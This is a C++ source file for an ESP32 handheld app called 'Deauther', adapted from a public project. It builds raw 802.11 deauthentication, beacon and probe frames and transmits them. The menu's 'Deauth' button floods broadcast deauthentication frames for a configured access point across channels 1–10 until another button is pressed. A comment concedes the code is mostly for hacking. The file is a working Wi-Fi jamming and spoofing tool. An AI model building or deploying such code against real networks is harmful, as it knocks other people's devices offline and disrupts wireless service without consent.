// most code used here was taken from: https://github.com/GANESH-ICMC/esp32-deauther/blob/master/main/packet.cpp

#include <deauther.hpp>

const uint8_t probePacket[] = {
    /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
    /*  4 - 9  */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence number (will be replaced by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                         // Tag: Set SSID length, Tag length: 32
    /* 26 - 57 */ 0x20, 0x20, 0x20, 0x20,             // SSID
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
    /* 60 */ 0x82,            // 1(B)
    /* 61 */ 0x84,            // 2(B)
    /* 62 */ 0x8b,            // 5.5(B)
    /* 63 */ 0x96,            // 11(B)
    /* 64 */ 0x24,            // 18
    /* 65 */ 0x30,            // 24
    /* 66 */ 0x48,            // 36
    /* 67 */ 0x6c             // 54
};

const uint8_t deauthPacket[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x3A, 0x01,                         // duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

const uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,             // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

    // Fixed parameters
    /* 22 - 23 */ 0x00, 0x00,                                     // Fragment & sequence number (will be done by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xff, 0xff,                                     // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
    /* 34 - 35 */ 0x31, 0x00,                                     // capabilities Tnformation

    // Tagged parameters

    // SSID parameters
    /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, // SSID

    // Supported Rates
    /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
    /* 72 */ 0x82,            // 1(B)
    /* 73 */ 0x84,            // 2(B)
    /* 74 */ 0x8b,            // 5.5(B)
    /* 75 */ 0x96,            // 11(B)
    /* 76 */ 0x24,            // 18
    /* 77 */ 0x30,            // 24
    /* 78 */ 0x48,            // 36
    /* 79 */ 0x6c,            // 54

    // Current Channel
    /* 80 - 81 */ 0x03, 0x01, // Channel set, length
    /* 82 */ 0x01,            // Current Channel

    // RSN information
    /*  83 -  84 */ 0x30, 0x18,
    /*  85 -  86 */ 0x01, 0x00,
    /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
    /*  91 -  92 */ 0x02, 0x00,
    /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
    /* 101 - 102 */ 0x01, 0x00,
    /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
    /* 107 - 108 */ 0x00, 0x00 // end
};

const mac_address TARGET = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

const mac_address AP = {
    // replace with your AP's mac address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

const char *button_prompts[] = {
    "Deauth",
    "Test button 2"};

Deauther::Deauther()
    : Application("Deauther"),
      sequence_number(0)
{
    char ssid[10];
    char password[10];

    kb->prompt_string(ssid, 10);
    kb->prompt_string(password, 10);

    ap_config.ap.ssid_len = 22;
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 60000;

    MEMCPY(ap_config.ap.ssid, ssid, 10);

    MEMCPY(ap_config.ap.password, password, 10);

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
}

void Deauther::setup()
{
    gfx->clearDisplayBuffer();

    gfx->allocateTexture(400, 240, TEXTURE_BINDING_1);
    gfx->changeContext(TEXTURE_BINDING_1);
    gfx->fillRect(0, 0, 400, 240, WHITE);
    gfx->fillRectD(4, 4, 390, 230);
    gfx->fillRect(9, 9, 380, 220, BLACK);

    gfx->setCursor(10, 10);
    gfx->fontSize(FONT_SIZE_3);
    gfx->println("Deauther menu:");

    gfx->changeContext(CONTEXT_BUFFER);
}

bool Deauther::loop()
{
    gfx->drawTexture(0, 0, TEXTURE_BINDING_1);

    if (is_pressed_sticky(BUTTON_DOWN_ID) && selected_button != 1)
        selected_button++;
    else if (is_pressed_sticky(BUTTON_UP_ID) && selected_button != 0)
        selected_button--;

    for (uint8_t i = 0; i < DEAUTHER_MENU_BUTTENS; i++)
    {
        button(gfx, 12, 30, !(i == selected_button), button_prompts[i]);
    }

    if (is_pressed_sticky(BUTTON_A_ID))
    {
        if (selected_button == 0)
        {
            while (!is_pressed_sticky(BUTTON_B_ID)) // after a is pressed check for button B for no accidental signal polution possiblity
            {
                for (uint8_t ch = 1; ch < 11; ch++)
                {
                    auto res = deauth_packet(TARGET, AP, AP, 1, ch);
                    if (res != ESP_OK)
                        printf("  Error: %s\n", esp_err_to_name(res));
                }
            }
        }
        else
        {
            Serial.println("lol button 2");
        }
    }

    gfx->refresh();

    return true;
}

void Deauther::cleanup()
{
    gfx->clearTexture(TEXTURE_BINDING_1);
    gfx->clearDisplayBuffer();
}

esp_err_t Deauther::change_channel(const uint8_t channel)
{
    ap_config.ap.channel = channel;

    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}

esp_err_t Deauther::deauth_packet(const mac_address ap, const mac_address station, const mac_address bssid, uint8_t reason, uint8_t channel)
{
    esp_err_t res = change_channel(channel);

    if (res != ESP_OK)
        return res;

    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[4], ap, 6);
    memcpy(&buffer[10], station, 6);
    memcpy(&buffer[16], bssid, 6);
    memcpy(&buffer[22], &sequence_number, 2);
    buffer[24] = reason;

    sequence_number++;

    res = send_raw(buffer, sizeof(deauthPacket));
    if (res == ESP_OK)
        return ESP_OK;
    buffer[0] = 0xa0;
    return send_raw(buffer, sizeof(deauthPacket));
}

// to announce network pressnace, kinda ussless in this case becouse this is used for mostly hacking reasons :P
esp_err_t Deauther::beacon_packet(const mac_address mac, const char *ssid, uint8_t channel, bool wpa2)
{
    esp_err_t res = change_channel(channel);
    if (res != ESP_OK)
        return res;

    int packetSize = sizeof(beaconPacket);
    int ssidLen = strlen(ssid);
    memcpy(buffer, beaconPacket, sizeof(beaconPacket));
    memcpy(&buffer[10], mac, 6);
    memcpy(&buffer[16], mac, 6);
    memcpy(&buffer[22], &sequence_number, 2);
    memcpy(&buffer[38], ssid, ssidLen);

    if (wpa2)
    {
        buffer[34] = 0x31;
    }
    else
    {
        buffer[34] = 0x21;
        packetSize -= 26;
    }
    buffer[82] = channel;

    buffer[37] = ssidLen;
    memcpy(&buffer[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13);

    sequence_number++;
    return send_raw(buffer, packetSize);
}

esp_err_t Deauther::probe_packet(const mac_address mac, const char *ssid, uint8_t channel)
{
    esp_err_t res = change_channel(channel);
    if (res != ESP_OK)
        return res;

    memcpy(buffer, probePacket, sizeof(probePacket));
    memcpy(&buffer[10], mac, 6);
    memcpy(&buffer[26], ssid, strlen(ssid));

    return send_raw(buffer, sizeof(probePacket));
}

esp_err_t Deauther::send_raw(const uint8_t *packet, int32_t len, bool en_sys_seq)
{
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
}
